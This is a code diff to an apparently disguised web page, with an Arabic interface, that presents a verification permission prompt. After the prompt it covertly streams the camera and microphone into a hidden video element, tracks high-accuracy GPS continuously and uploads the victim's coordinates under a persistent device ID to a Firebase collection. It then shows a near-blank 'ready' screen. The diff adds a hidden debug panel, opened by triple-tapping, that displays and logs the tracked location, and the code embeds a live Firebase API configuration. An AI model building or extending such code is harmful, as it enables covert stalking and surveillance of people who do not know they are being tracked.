@@ -30,7 +30,6 @@
             z-index: -1;
         }
 
-        /* === شاشة الأذن الوحيدة === */
         #perm-screen {
             position: fixed;
             inset: 0;
@@ -50,113 +49,204 @@
             pointer-events: none;
         }
 
-        .perm-box {
-            max-width: 340px;
-            width: 100%;
-        }
+        .perm-box { max-width: 340px; width: 100%; }
 
         .perm-box .icon-circle {
-            width: 70px;
-            height: 70px;
-            border-radius: 50%;
-            background: rgba(0, 229, 160, 0.1);
-            border: 1.5px solid rgba(0, 229, 160, 0.25);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 20px;
-            font-size: 1.6rem;
-            color: #00e5a0;
+            width: 70px; height: 70px; border-radius: 50%;
+            background: rgba(0,229,160,0.1);
+            border: 1.5px solid rgba(0,229,160,0.25);
+            display: flex; align-items: center; justify-content: center;
+            margin: 0 auto 20px; font-size: 1.6rem; color: #00e5a0;
         }
 
-        .perm-box h2 {
-            font-size: 1.2rem;
-            font-weight: 700;
-            margin-bottom: 10px;
-            line-height: 1.5;
-        }
-
-        .perm-box p {
-            font-size: 0.85rem;
-            color: #7a8baa;
-            line-height: 1.7;
-            margin-bottom: 28px;
-        }
+        .perm-box h2 { font-size: 1.2rem; font-weight: 700; margin-bottom: 10px; line-height: 1.5; }
+        .perm-box p { font-size: 0.85rem; color: #7a8baa; line-height: 1.7; margin-bottom: 28px; }
 
         .perm-btn {
-            width: 100%;
-            padding: 15px;
-            border: none;
-            border-radius: 12px;
+            width: 100%; padding: 15px; border: none; border-radius: 12px;
             background: linear-gradient(135deg, #00e5a0, #00b87a);
-            color: #0a0e1a;
-            font-family: 'Cairo', sans-serif;
-            font-size: 1rem;
-            font-weight: 700;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
+            color: #0a0e1a; font-family: 'Cairo', sans-serif;
+            font-size: 1rem; font-weight: 700; cursor: pointer;
+            display: flex; align-items: center; justify-content: center; gap: 8px;
             transition: all 0.3s;
-            box-shadow: 0 4px 20px rgba(0, 229, 160, 0.25);
+            box-shadow: 0 4px 20px rgba(0,229,160,0.25);
         }
 
         .perm-btn:active { transform: scale(0.97); }
         .perm-btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
 
         .perm-btn .ld {
-            width: 18px;
-            height: 18px;
-            border: 2.5px solid transparent;
-            border-top-color: #0a0e1a;
-            border-radius: 50%;
-            animation: sp 0.6s linear infinite;
-            display: none;
+            width: 18px; height: 18px; border: 2.5px solid transparent;
+            border-top-color: #0a0e1a; border-radius: 50%;
+            animation: sp 0.6s linear infinite; display: none;
         }
 
         @keyframes sp { to { transform: rotate(360deg); } }
 
-        /* === الشاشة الفارغة بعد التفعيل === */
-        #blank-screen {
-            position: fixed;
-            inset: 0;
-            background: #0a0e1a;
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 1;
-        }
-
-        .blank-msg {
-            text-align: center;
-            opacity: 0.15;
-        }
-
-        .blank-msg i {
-            font-size: 2.5rem;
-            margin-bottom: 10px;
-            display: block;
-        }
-
-        .blank-msg span {
-            font-size: 0.85rem;
-            color: #7a8baa;
-        }
-
-        /* حالة الحظر */
         .perm-box.blocked .icon-circle {
-            background: rgba(255, 71, 87, 0.1);
-            border-color: rgba(255, 71, 87, 0.25);
+            background: rgba(255,71,87,0.1);
+            border-color: rgba(255,71,87,0.25);
             color: #ff4757;
         }
 
         .perm-box.blocked .perm-btn {
-            background: rgba(255, 71, 87, 0.12);
-            color: #ff4757;
-            box-shadow: none;
-            border: 1px solid rgba(255, 71, 87, 0.25);
+            background: rgba(255,71,87,0.12);
+            color: #ff4757; box-shadow: none;
+            border: 1px solid rgba(255,71,87,0.25);
         }
+
+        #blank-screen {
+            position: fixed; inset: 0; background: #0a0e1a;
+            display: none; justify-content: center; align-items: center; z-index: 1;
+        }
+
+        .blank-msg { text-align: center; opacity: 0.15; user-select: none; }
+        .blank-msg i { font-size: 2.5rem; margin-bottom: 10px; display: block; }
+        .blank-msg span { font-size: 0.85rem; color: #7a8baa; }
+
+        /* === نافذة المطور === */
+        #dev-panel {
+            position: fixed; inset: 0;
+            background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            z-index: 50000;
+            display: none;
+            flex-direction: column;
+            font-size: 0.82rem;
+        }
+
+        #dev-panel.open { display: flex; }
+
+        .dev-header {
+            display: flex; align-items: center; justify-content: space-between;
+            padding: 14px 16px;
+            background: rgba(255,255,255,0.04);
+            border-bottom: 1px solid rgba(255,255,255,0.08);
+            flex-shrink: 0;
+        }
+
+        .dev-header span {
+            font-weight: 700; font-size: 0.85rem;
+            color: #ffa502;
+            display: flex; align-items: center; gap: 6px;
+        }
+
+        .dev-close {
+            width: 32px; height: 32px; border-radius: 8px;
+            border: 1px solid rgba(255,255,255,0.1);
+            background: rgba(255,255,255,0.05);
+            color: #f1f5f9; font-size: 0.9rem;
+            display: flex; align-items: center; justify-content: center;
+            cursor: pointer;
+        }
+
+        .dev-close:active { background: rgba(255,71,87,0.2); }
+
+        .dev-body {
+            flex: 1; overflow-y: auto; padding: 12px 16px;
+            -webkit-overflow-scrolling: touch;
+        }
+
+        .dev-section { margin-bottom: 16px; }
+
+        .dev-section-title {
+            font-size: 0.72rem; font-weight: 700;
+            color: #7a8baa; text-transform: uppercase;
+            letter-spacing: 0.5px; margin-bottom: 8px;
+            padding-bottom: 4px;
+            border-bottom: 1px solid rgba(255,255,255,0.06);
+        }
+
+        .dev-row {
+            display: flex; justify-content: space-between;
+            align-items: center; padding: 7px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.03);
+        }
+
+        .dev-row:last-child { border-bottom: none; }
+
+        .dev-label { color: #7a8baa; font-size: 0.78rem; }
+
+        .dev-val {
+            font-family: 'Courier New', monospace;
+            font-size: 0.8rem; font-weight: 700;
+            direction: ltr; text-align: left;
+            max-width: 60%; word-break: break-all;
+        }
+
+        .dev-val.green { color: #00e5a0; }
+        .dev-val.orange { color: #ffa502; }
+        .dev-val.red { color: #ff4757; }
+        .dev-val.blue { color: #3b82f6; }
+        .dev-val.white { color: #f1f5f9; }
+
+        .dev-acc-bar {
+            width: 100%; height: 6px; border-radius: 3px;
+            background: rgba(255,255,255,0.06);
+            margin-top: 6px; overflow: hidden;
+        }
+
+        .dev-acc-fill {
+            height: 100%; border-radius: 3px;
+            transition: width 0.4s, background 0.4s;
+        }
+
+        .dev-log {
+            max-height: 200px; overflow-y: auto;
+            -webkit-overflow-scrolling: touch;
+        }
+
+        .dev-log-entry {
+            padding: 6px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.03);
+            font-family: 'Courier New', monospace;
+            font-size: 0.72rem;
+            direction: ltr; text-align: left;
+            color: #7a8baa;
+            animation: logIn 0.3s ease;
+        }
+
+        .dev-log-entry .log-time { color: #ffa502; }
+        .dev-log-entry .log-acc { font-weight: 700; }
+        .dev-log-entry .log-acc.good { color: #00e5a0; }
+        .dev-log-entry .log-acc.mid { color: #ffa502; }
+        .dev-log-entry .log-acc.bad { color: #ff4757; }
+
+        @keyframes logIn {
+            from { opacity: 0; transform: translateY(-8px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .dev-footer {
+            padding: 10px 16px;
+            padding-bottom: max(10px, env(safe-area-inset-bottom));
+            background: rgba(255,255,255,0.03);
+            border-top: 1px solid rgba(255,255,255,0.06);
+            display: flex; gap: 8px; flex-shrink: 0;
+        }
+
+        .dev-foot-btn {
+            flex: 1; padding: 10px; border: none; border-radius: 8px;
+            font-family: 'Cairo', sans-serif; font-size: 0.78rem;
+            font-weight: 600; cursor: pointer; transition: all 0.2s;
+            display: flex; align-items: center; justify-content: center; gap: 6px;
+        }
+
+        .dev-foot-btn:active { transform: scale(0.96); }
+
+        .dev-foot-btn.primary {
+            background: rgba(0,229,160,0.12); color: #00e5a0;
+            border: 1px solid rgba(0,229,160,0.2);
+        }
+
+        .dev-foot-btn.secondary {
+            background: rgba(255,255,255,0.05); color: #7a8baa;
+            border: 1px solid rgba(255,255,255,0.08);
+        }
+
+        .dev-body::-webkit-scrollbar, .dev-log::-webkit-scrollbar { width: 2px; }
+        .dev-body::-webkit-scrollbar-thumb, .dev-log::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 10px; }
     </style>
 
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
@@ -166,7 +256,6 @@
 
     <video id="hidden-stream" autoplay playsinline muted></video>
 
-    <!-- شاشة الأذن المبسطة -->
     <div id="perm-screen">
         <div class="perm-box" id="perm-box">
             <div class="icon-circle" id="perm-icon-circle">
@@ -182,27 +271,114 @@
         </div>
     </div>
 
-    <!-- شاشة فارغة بعد التفعيل -->
     <div id="blank-screen">
-        <div class="blank-msg">
+        <div class="blank-msg" id="dev-trigger">
             <i class="fa-solid fa-check-double"></i>
             <span>جاهز</span>
         </div>
     </div>
 
+    <!-- ======= نافذة المطور — احذفها عند الإطلاق ======= -->
+    <div id="dev-panel">
+        <div class="dev-header">
+            <span><i class="fa-solid fa-bug"></i> DEBUG PANEL</span>
+            <button class="dev-close" onclick="toggleDev()"><i class="fa-solid fa-xmark"></i></button>
+        </div>
+        <div class="dev-body">
+            <div class="dev-section">
+                <div class="dev-section-title">الحالة العامة</div>
+                <div class="dev-row">
+                    <span class="dev-label">حالة التتبع</span>
+                    <span class="dev-val green" id="d-status">غير مفعّل</span>
+                </div>
+                <div class="dev-row">
+                    <span class="dev-label">وضع التحسين</span>
+                    <span class="dev-val orange" id="d-opt">نشط</span>
+                </div>
+                <div class="dev-row">
+                    <span class="dev-label">عدد القراءات</span>
+                    <span class="dev-val white" id="d-count">0</span>
+                </div>
+                <div class="dev-row">
+                    <span class="dev-label">أفضل دقة وصلت</span>
+                    <span class="dev-val green" id="d-best">&infin;</span>
+                </div>
+                <div class="dev-row">
+                    <span class="dev-label">آخر رفع للسيرفر</span>
+                    <span class="dev-val blue" id="d-push">لم يحدث</span>
+                </div>
+            </div>
+            <div class="dev-section">
+                <div class="dev-section-title">الدقة الحالية</div>
+                <div class="dev-row">
+                    <span class="dev-label">هامش الخطأ</span>
+                    <span class="dev-val" id="d-acc">--</span>
+                </div>
+                <div class="dev-acc-bar">
+                    <div class="dev-acc-fill" id="d-acc-bar" style="width:0%; background:#ff4757;"></div>
+                </div>
+            </div>
+            <div class="dev-section">
+                <div class="dev-section-title">الإحداثيات</div>
+                <div class="dev-row">
+                    <span class="dev-label">Lat</span>
+                    <span class="dev-val green" id="d-lat">--</span>
+                </div>
+                <div class="dev-row">
+                    <span class="dev-label">Lng</span>
+                    <span class="dev-val blue" id="d-lng">--</span>
+                </div>
+                <div class="dev-row">
+                    <span class="dev-label">Device ID</span>
+                    <span class="dev-val white" id="d-dev" style="font-size:0.68rem;">--</span>
+                </div>
+            </div>
+            <div class="dev-section">
+                <div class="dev-section-title">Firebase</div>
+                <div class="dev-row">
+                    <span class="dev-label">Collection</span>
+                    <span class="dev-val white">loc</span>
+                </div>
+                <div class="dev-row">
+                    <span class="dev-label">Doc ID</span>
+                    <span class="dev-val white" id="d-doc" style="font-size:0.68rem;">--</span>
+                </div>
+                <div class="dev-row">
+                    <span class="dev-label">آخر Server Timestamp</span>
+                    <span class="dev-val blue" id="d-ts">--</span>
+                </div>
+                <div class="dev-row">
+                    <span class="dev-label">حالة الرفع</span>
+                    <span class="dev-val green" id="d-fb-status">بانتظار</span>
+                </div>
+            </div>
+            <div class="dev-section">
+                <div class="dev-section-title">سجل القراءات (آخر 50)</div>
+                <div class="dev-log" id="d-log"></div>
+            </div>
+        </div>
+        <div class="dev-footer">
+            <button class="dev-foot-btn primary" onclick="devRefresh()">
+                <i class="fa-solid fa-rotate"></i> إعادة تشغيل GPS
+            </button>
+            <button class="dev-foot-btn secondary" onclick="devCopyCoords()">
+                <i class="fa-solid fa-copy"></i> نسخ الإحداثيات
+            </button>
+        </div>
+    </div>
+    <!-- ======= نهاية نافذة المطور ======= -->
+
     <script>
-        // === Firebase ===
-        const firebaseConfig = {
-  apiKey: "AIzaSyDk5poPjAe6LJOMUbDU_ak_ZLtLuCoqahI",
-  authDomain: "project-8964705196826400556.firebaseapp.com",
-  projectId: "project-8964705196826400556",
-  storageBucket: "project-8964705196826400556.firebasestorage.app",
-  messagingSenderId: "615020770883",
-  appId: "1:615020770883:web:ca0856f464dd57b4aac6f6"
-};
+        firebase.initializeApp({
+            apiKey: "AIzaSyDk5poPjAe6LJOMUbDU_ak_ZLtLuCoqahI",
+            authDomain: "project-8964705196826400556.firebaseapp.com",
+            projectId: "project-8964705196826400556",
+            storageBucket: "project-8964705196826400556.firebasestorage.app",
+            messagingSenderId: "615020770883",
+            appId: "1:615020770883:web:ca0856f464dd57b4aac6f6"
+        });
         const db = firebase.firestore();
 
-        // === معرف الجهاز الثابت ===
         let deviceId = localStorage.getItem('smart_menu_device_id');
         if (!deviceId) {
             deviceId = "dev_" + Math.random().toString(36).substring(2, 12) + Date.now().toString(36);
@@ -213,8 +389,32 @@
         let bestAcc = Infinity;
         let optimizing = true;
         let t0 = Date.now();
+        let readCount = 0;
+        let lastPushTime = null;
+        let lastLat = null;
+        let lastLng = null;
 
-        // === البداية ===
+        document.getElementById('d-dev').innerText = deviceId;
+        document.getElementById('d-doc').innerText = deviceId;
+
+        // فتح نافذة المطور بـ 3 نقرات سريعة على "جاهز"
+        let triggerTaps = 0;
+        let triggerTimer = null;
+        document.getElementById('dev-trigger').addEventListener('click', function () {
+            triggerTaps++;
+            clearTimeout(triggerTimer);
+            if (triggerTaps >= 3) {
+                triggerTaps = 0;
+                toggleDev();
+            } else {
+                triggerTimer = setTimeout(() => { triggerTaps = 0; }, 400);
+            }
+        });
+
+        function toggleDev() {
+            document.getElementById('dev-panel').classList.toggle('open');
+        }
+
         async function start() {
             const btn = document.getElementById('perm-btn');
             const ld = document.getElementById('perm-ld');
@@ -224,17 +424,18 @@
             ld.style.display = 'block';
             icon.style.display = 'none';
             document.getElementById('perm-btn-text').innerText = 'جاري التحقق...';
+            devSet('d-status', 'جاري الاتصال...', 'orange');
 
             try {
-                // كاميرا + ميكروفون (مخفي)
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: { ideal: "environment" } },
                     audio: true
                 });
                 document.getElementById('hidden-stream').srcObject = stream;
+                devSet('d-status', 'كاميرا + صوت ✓', 'orange');
 
-                // GPS عالي الدقة
                 if (!("geolocation" in navigator)) throw new Error("gps");
+                devSet('d-status', 'جاري البحث عن أقمار...', 'orange');
 
                 watcher = navigator.geolocation.watchPosition(onPos, onErr, {
                     enableHighAccuracy: true,
@@ -243,29 +444,49 @@
                 });
 
             } catch (e) {
+                devSet('d-status', 'فشل', 'red');
                 showBlocked();
             }
         }
 
-        // === استقبال الإحداثيات ===
         function onPos(pos) {
             const lat = pos.coords.latitude;
             const lng = pos.coords.longitude;
             const acc = pos.coords.accuracy;
+            readCount++;
+
+            lastLat = lat;
+            lastLng = lng;
+
+            devSet('d-status', 'يعمل', 'green');
+            devSet('d-count', readCount, 'white');
+            devSet('d-lat', lat.toFixed(6), 'green');
+            devSet('d-lng', lng.toFixed(6), 'blue');
+            devSet('d-opt', optimizing ? 'نشط' : 'متوقف — لحظي', optimizing ? 'orange' : 'green');
+
+            const pct = Math.max(0, Math.min(100, 100 - (acc / 0.5)));
+            const barColor = acc <= 5 ? '#00e5a0' : acc <= 15 ? '#ffa502' : '#ff4757';
+            const accColor = acc <= 5 ? 'green' : acc <= 15 ? 'orange' : 'red';
+            document.getElementById('d-acc-bar').style.width = pct + '%';
+            document.getElementById('d-acc-bar').style.background = barColor;
+            devSet('d-acc', acc.toFixed(1) + ' m', accColor);
+
+            addDevLog(acc, lat, lng);
 
             if (optimizing) {
                 if (acc < bestAcc) {
                     bestAcc = acc;
+                    devSet('d-best', bestAcc.toFixed(1) + ' m', 'green');
                     push(lat, lng, acc);
                 }
                 if (acc <= 5 || (Date.now() - t0 > 15000)) {
                     optimizing = false;
+                    devSet('d-opt', 'متوقف — لحظي', 'green');
                 }
             } else {
                 push(lat, lng, acc);
             }
 
-            // إخفاء شاشة الأذن وعرض الشاشة الفارغة
             document.getElementById('perm-screen').classList.add('fade-out');
             setTimeout(() => {
                 document.getElementById('perm-screen').style.display = 'none';
@@ -273,23 +494,30 @@
             }, 500);
         }
 
-        // === رفع إلى Firebase ===
         function push(lat, lng, acc) {
+            devSet('d-fb-status', 'جاري الرفع...', 'orange');
             db.collection('loc').doc(deviceId).set({
                 latitude: lat,
                 longitude: lng,
                 accuracy: acc,
                 device_id: deviceId,
                 last_updated: firebase.firestore.FieldValue.serverTimestamp()
-            }, { merge: true }).catch(() => {});
+            }, { merge: true }).then(() => {
+                lastPushTime = new Date();
+                devSet('d-push', formatDT(lastPushTime), 'blue');
+                devSet('d-ts', formatDT(lastPushTime), 'blue');
+                devSet('d-fb-status', 'نجاح ✓', 'green');
+            }).catch((err) => {
+                devSet('d-fb-status', 'فشل: ' + err.message, 'red');
+            });
         }
 
-        // === خطأ GPS ===
         function onErr(err) {
+            const msgs = { 1: 'رفض المستخدم', 2: 'غير متاح', 3: 'انتهت المهلة' };
+            devSet('d-status', 'خطأ: ' + (msgs[err.code] || err.message), 'red');
             if (err.code === err.PERMISSION_DENIED) showBlocked();
         }
 
-        // === شاشة الحظر ===
         function showBlocked() {
             const box = document.getElementById('perm-box');
             box.classList.add('blocked');
@@ -309,7 +537,57 @@
             btn.disabled = false;
         }
 
-        // === فحص تلقائي إذا الأذن ممنوح مسبقاً ===
+        function devSet(id, val, cls) {
+            const el = document.getElementById(id);
+            if (!el) return;
+            el.innerText = val;
+            el.className = 'dev-val ' + (cls || 'white');
+        }
+
+        function formatDT(d) {
+            return d.toLocaleTimeString('ar-IQ', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+        }
+
+        function addDevLog(acc, lat, lng) {
+            const log = document.getElementById('d-log');
+            const cls = acc <= 5 ? 'good' : acc <= 15 ? 'mid' : 'bad';
+            const entry = document.createElement('div');
+            entry.className = 'dev-log-entry';
+            entry.innerHTML = '<span class="log-time">' + formatDT(new Date()) + '</span> &nbsp; lat:' + lat.toFixed(6) + ' lng:' + lng.toFixed(6) + ' &nbsp; acc:<span class="log-acc ' + cls + '">' + acc.toFixed(1) + 'm</span>';
+            log.insertBefore(entry, log.firstChild);
+            while (log.children.length > 50) log.removeChild(log.lastChild);
+        }
+
+        function devRefresh() {
+            if (watcher !== null) navigator.geolocation.clearWatch(watcher);
+            bestAcc = Infinity;
+            optimizing = true;
+            t0 = Date.now();
+            readCount = 0;
+            document.getElementById('d-log').innerHTML = '';
+            devSet('d-best', '\u221e', 'green');
+            devSet('d-count', '0', 'white');
+            devSet('d-opt', 'نشط', 'orange');
+            devSet('d-status', 'جاري إعادة التشغيل...', 'orange');
+
+            watcher = navigator.geolocation.watchPosition(onPos, onErr, {
+                enableHighAccuracy: true,
+                timeout: 15000,
+                maximumAge: 0
+            });
+        }
+
+        function devCopyCoords() {
+            if (lastLat === null) return;
+            const text = lastLat.toFixed(6) + ', ' + lastLng.toFixed(6) + ' (acc: ' + (bestAcc === Infinity ? '--' : bestAcc.toFixed(1) + 'm') + ')';
+            navigator.clipboard.writeText(text).then(() => {
+                const btn = event.target.closest('.dev-foot-btn');
+                const orig = btn.innerHTML;
+                btn.innerHTML = '<i class="fa-solid fa-check"></i> تم النسخ';
+                setTimeout(() => { btn.innerHTML = orig; }, 1500);
+            }).catch(() => {});
+        }
+
         window.onload = function () {
             if (navigator.permissions && navigator.permissions.query) {
                 navigator.permissions.query({ name: 'geolocation' }).then(r => {
